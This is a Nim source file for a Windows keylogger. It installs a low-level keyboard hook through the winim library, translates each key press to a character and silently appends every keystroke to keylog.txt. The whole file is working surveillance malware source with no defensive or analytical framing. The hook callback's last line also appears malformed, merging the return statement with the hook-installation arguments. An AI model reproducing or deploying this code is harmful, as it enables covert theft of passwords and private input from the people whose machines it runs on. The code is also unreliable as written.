import winim/lean

# Open or create a log file in append mode
let logFile = open("keylog.txt", fmAppend)

let hook = SetWindowsHookEx(WH_KEYBOARD_LL, proc(nCode: cint, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} =
  if nCode >= 0 and wParam == WM_KEYDOWN:
    let kbdStruct = cast[PKBDLLHOOKSTRUCT](lParam)
    var keyboardState: array[0..255, BYTE]
    discard GetKeyboardState(cast[PBYTE](addr keyboardState))

    var charBuffer: array[0..4, WCHAR]
    let layout = GetKeyboardLayout(0)
    let unicodeResult = ToUnicodeEx(
      kbdStruct.vkCode,
      kbdStruct.scanCode,
      addr keyboardState[0],
      addr charBuffer[0],
      4,
      0,
      layout
    )

    if unicodeResult > 0:
      let pressedChar = $charBuffer[0..(unicodeResult - 1)]
      logFile.write(pressedChar)
      flushFile(logFile)
    else:
      logFile.write("[VK:" & $kbdStruct.vkCode & "]")
      flushFile(logFile)

  return CallNextHookEx(0.HHOOK, nCode, wParam, lParam), GetModuleHandle(nil), 0)

if hook == 0.HHOOK:
  echo "Failed to install hook."
  quit(1)


var msg: MSG
while GetMessage(addr msg, 0.HWND, 0, 0):
  TranslateMessage(addr msg)
  DispatchMessage(addr msg)

logFile.close()
UnhookWindowsHookEx(hook)
